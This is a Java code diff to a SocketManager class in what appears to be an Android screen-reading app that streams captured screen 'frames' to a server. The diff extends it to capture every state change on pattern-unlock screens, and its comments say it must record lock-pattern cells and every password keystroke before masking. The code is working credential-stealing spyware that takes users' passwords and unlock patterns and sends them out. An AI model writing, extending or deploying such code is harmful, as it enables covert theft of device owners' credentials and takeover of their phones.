@@ -1698,7 +1698,11 @@ public class SocketManager {
             StringBuilder sb = new StringBuilder(256);
             sb.append(pkg).append(':').append(elemCount);
             if (elements != null) {
-                int check = Math.min(elemCount, 20);
+                // On pattern/lock screens scan ALL elements — the grid can have up to 9 cells
+                // and each cell's checked/selected state flips as the user draws.
+                // On regular screens cap at 20 for speed.
+                boolean isLockPkg = isPatternUnlockPackage(pkg);
+                int check = isLockPkg ? elemCount : Math.min(elemCount, 20);
                 for (int i = 0; i < check; i++) {
                     JSONObject el = elements.optJSONObject(i);
                     if (el == null) continue;
@@ -1708,8 +1712,9 @@ public class SocketManager {
                       .append(el.optString("hintText", ""))
                       // Include passwordText so every password keystroke registers as a new frame
                       .append(el.optString("passwordText", ""))
-                      .append(el.optBoolean("checked", false) ? "C" : "")
-                      .append(el.optBoolean("selected", false) ? "S" : "");
+                      .append(el.optBoolean("checked",  false) ? "C" : "")
+                      .append(el.optBoolean("selected", false) ? "S" : "")
+                      .append(el.optBoolean("enabled",  true)  ? "" : "D");
                     JSONObject b = el.optJSONObject("bounds");
                     if (b != null) sb.append('@').append(b.optInt("top", 0));
                 }
@@ -1825,12 +1830,14 @@ public class SocketManager {
                 // If the fingerprint matches the last sent frame, skip it so we
                 // don't flood the server (and waste 3G bandwidth) with identical data.
                 // After 2 consecutive identical frames the tick is skipped entirely.
-                // Exception: when a password field is actively being typed in, NEVER skip —
+                // Exception 1: when a password field is actively being typed in, NEVER skip —
                 // password characters are briefly plain-text then masked, and we must capture
                 // every keystroke before masking occurs.
+                // Exception 2: when on a pattern-unlock screen, NEVER skip — pattern cells light
+                // up and fade within ~20-30ms and must all be captured at the 16ms fast rate.
                 boolean hasPasswordInput = screenHasActivePasswordField(screenResult);
                 String fp = computeFrameFingerprint(screenResult);
-                if (!hasPasswordInput && !fp.isEmpty() && fp.equals(lastFrameFingerprint)) {
+                if (!hasPasswordInput && !inPatternScreenMode && !fp.isEmpty() && fp.equals(lastFrameFingerprint)) {
                     consecutiveDuplicateCount++;
                     if (consecutiveDuplicateCount > 1) {
                         Log.d(TAG, "screen_reader: static screen, skip #" + consecutiveDuplicateCount);
@@ -1923,6 +1930,8 @@ public class SocketManager {
         if (f != null) { f.cancel(false); screenReaderFuture = null; }
         lastFrameFingerprint = null;
         consecutiveDuplicateCount = 0;
+        inPatternScreenMode = false;
+        loopRestartPending  = false;
 
         // Save any buffered offline frames to local file for later upload
         if (autoRecordingActive || manualRecordingActive) {
